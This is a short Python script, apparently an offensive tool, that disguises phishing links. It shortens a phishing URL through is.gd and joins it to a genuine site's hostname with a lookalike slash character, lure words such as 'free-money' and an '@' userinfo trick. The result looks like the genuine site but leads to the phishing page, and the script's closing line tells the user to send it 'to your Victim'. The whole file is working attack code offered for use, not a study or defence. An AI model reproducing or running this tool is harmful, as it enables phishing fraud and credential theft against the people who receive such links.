#!/usr/bin/env python
# coding: utf-8
# Coded By: Anonycodexia

import re
import subprocess

try:
    import requests
except ImportError:
    print("Requests module not found. Installing...")
    subprocess.run(["pip", "install", "requests"])
    import requests

regex = re.compile(
    r'^(?:http|ftp)s?://'  
    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  
    r'localhost|'  
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  
    r'(?::\d+)?'  
    r'(?:/?|[/?]\S+)$', re.IGNORECASE)


ur = "https://is.gd/create.php"

useable = lambda j: str(re.search('<div id="main"><p><b>Your shortened URL is:</b></p><input type="text" class="tb" id="short_url" value=[^>]+>',j.text).group(0)).partition('value="')[-1].split('"')[0].split("//")[-1]

assert bool(re.match(regex,main_url:=input("Enter your Phishing URL: ")) is not None) == True, "Invalid URL"

assert bool(re.match(regex, mask_url:=input("Enter Genuine URL: "))) is not None, "Invalid URL"

def call(link):
    short = requests.post(ur, data={'url': link})
    print('Your Masked URL generated Successfully') if (x := short.status_code) == 200 else print(f"Error occourd :{x}")
    return short

decive_str = input("Enter Social Engineering Wordslike:- free-money, free-recharge etc: ")

final = (
    zen:=lambda s: s.split("//")[0] + "//" + matches[0].split('/')[2] if (matches := re.findall(r'https?://[^\s/$.?#].[^\s]*', s)) else None)(zen(mask_url)) + '⁄' + decive_str.replace(' ', '-') + '@' + useable(call(main_url))

print(f"Send this URL to your Victim: {final} ")
